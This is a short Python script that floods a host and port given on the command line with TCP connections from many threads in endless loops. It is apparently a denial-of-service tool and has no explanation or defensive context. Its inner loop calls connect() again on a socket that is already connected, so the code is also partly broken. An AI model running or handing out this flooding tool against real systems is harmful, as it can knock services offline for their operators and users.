import os,sys
import socket, threading
ip = str(sys.argv[1])
ip = socket.gethostbyname(ip)
port = int(sys.argv[2])
threads = int(sys.argv[3])
conn = int(sys.argv[4])
def run():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((ip, port))
            print("[+] Sended 1 Conn.")
            for x in range(conn):
                s.connect((ip,port))
        except:
            s.close()

for y in range(threads):
    th = threading.Thread(target=run)
    th.start()
